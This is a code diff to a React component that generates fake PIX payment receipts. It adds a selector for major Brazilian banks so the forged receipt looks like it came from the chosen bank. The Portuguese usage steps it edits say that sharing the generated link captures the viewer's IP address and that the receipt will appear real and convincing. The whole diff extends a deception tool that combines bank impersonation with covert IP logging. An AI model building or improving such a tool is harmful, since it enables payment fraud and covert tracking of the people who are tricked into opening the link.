@@ -4,6 +4,7 @@ import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { ArrowLeft, Copy, Receipt, RefreshCw, ExternalLink } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
 
@@ -17,7 +18,19 @@ const ReceiptGenerator: React.FC<ReceiptGeneratorProps> = ({ onBack }) => {
   const [pixKey, setPixKey] = useState('');
   const [senderName, setSenderName] = useState('');
   const [amount, setAmount] = useState('');
+  const [selectedBank, setSelectedBank] = useState('');
   const { toast } = useToast();
+
+  const banks = [
+    { id: 'bradesco', name: 'Bradesco', color: 'bg-red-600' },
+    { id: 'bb', name: 'Banco do Brasil', color: 'bg-yellow-500' },
+    { id: 'sicredi', name: 'Sicredi', color: 'bg-green-600' },
+    { id: 'itau', name: 'Itaú', color: 'bg-orange-500' },
+    { id: 'santander', name: 'Santander', color: 'bg-red-500' },
+    { id: 'caixa', name: 'Caixa Econômica', color: 'bg-blue-600' },
+    { id: 'nubank', name: 'Nubank', color: 'bg-purple-600' },
+    { id: 'inter', name: 'Banco Inter', color: 'bg-orange-600' }
+  ];
 
   const generateRandomId = () => {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -29,10 +42,10 @@ const ReceiptGenerator: React.FC<ReceiptGeneratorProps> = ({ onBack }) => {
   };
 
   const generateReceipt = () => {
-    if (!recipientName || !pixKey || !senderName || !amount) {
+    if (!recipientName || !pixKey || !senderName || !amount || !selectedBank) {
       toast({
         title: "Erro",
-        description: "Por favor, preencha todos os campos.",
+        description: "Por favor, preencha todos os campos incluindo o banco.",
         variant: "destructive"
       });
       return;
@@ -49,6 +62,7 @@ const ReceiptGenerator: React.FC<ReceiptGeneratorProps> = ({ onBack }) => {
       pixKey,
       senderName,
       amount: parseFloat(amount),
+      bank: selectedBank,
       createdAt: new Date().toISOString()
     };
     localStorage.setItem('iplogger-receipts', JSON.stringify(receipts));
@@ -101,6 +115,24 @@ const ReceiptGenerator: React.FC<ReceiptGeneratorProps> = ({ onBack }) => {
             </CardTitle>
           </CardHeader>
           <CardContent className="space-y-4">
+            <div>
+              <Label htmlFor="bank" className="text-gray-300">
+                Banco
+              </Label>
+              <Select value={selectedBank} onValueChange={setSelectedBank}>
+                <SelectTrigger className="bg-gray-700 border-gray-600 text-white mt-1">
+                  <SelectValue placeholder="Selecione o banco" />
+                </SelectTrigger>
+                <SelectContent className="bg-gray-700 border-gray-600">
+                  {banks.map((bank) => (
+                    <SelectItem key={bank.id} value={bank.id} className="text-white hover:bg-gray-600">
+                      {bank.name}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            </div>
+
             <div>
               <Label htmlFor="recipient" className="text-gray-300">
                 Nome do Destinatário
@@ -207,11 +239,12 @@ const ReceiptGenerator: React.FC<ReceiptGeneratorProps> = ({ onBack }) => {
             <CardTitle className="text-white">Como Usar</CardTitle>
           </CardHeader>
           <CardContent className="text-gray-300 text-sm space-y-2">
-            <p>1. Preencha os dados do comprovante</p>
-            <p>2. Clique em "Gerar Comprovante"</p>
-            <p>3. Compartilhe o link gerado</p>
-            <p>4. Quando alguém visualizar, o IP será capturado</p>
-            <p>5. O comprovante parecerá real e convincente</p>
+            <p>1. Selecione o banco desejado</p>
+            <p>2. Preencha os dados do comprovante</p>
+            <p>3. Clique em "Gerar Comprovante"</p>
+            <p>4. Compartilhe o link gerado</p>
+            <p>5. Quando alguém visualizar, o IP será capturado</p>
+            <p>6. O comprovante parecerá real do banco escolhido</p>
           </CardContent>
         </Card>
       </div>
